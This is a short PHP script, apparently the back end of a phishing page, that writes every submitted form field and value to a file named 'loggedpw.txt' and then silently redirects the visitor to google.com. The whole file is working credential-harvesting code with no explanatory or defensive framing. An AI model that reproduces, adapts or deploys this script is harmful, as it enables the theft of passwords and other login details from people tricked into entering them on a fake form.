<!--Creagh DUGGAN-->

<?php
$handle = fopen("loggedpw.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
$redirect_to = "http://www.google.com"; 
echo "<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><meta http-equiv=\"refresh\" content=\"0;URL='" . $redirect_to . "'\" /></head></html>";
exit;
?>